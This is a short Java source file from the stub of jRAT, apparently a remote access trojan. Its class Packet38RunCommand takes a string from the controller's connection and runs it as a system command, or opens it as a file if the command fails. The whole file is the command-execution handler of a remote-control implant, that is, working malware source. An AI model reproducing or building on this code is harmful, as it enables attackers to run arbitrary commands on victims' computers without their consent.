package se.jrat.stub.packets.incoming;

import java.awt.Desktop;
import java.io.File;

import se.jrat.stub.Connection;


public class Packet38RunCommand extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.instance.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Desktop.getDesktop().open(new File(process));
			} catch (Exception ex1) {
				ex1.printStackTrace();
			}
		}
	}

}
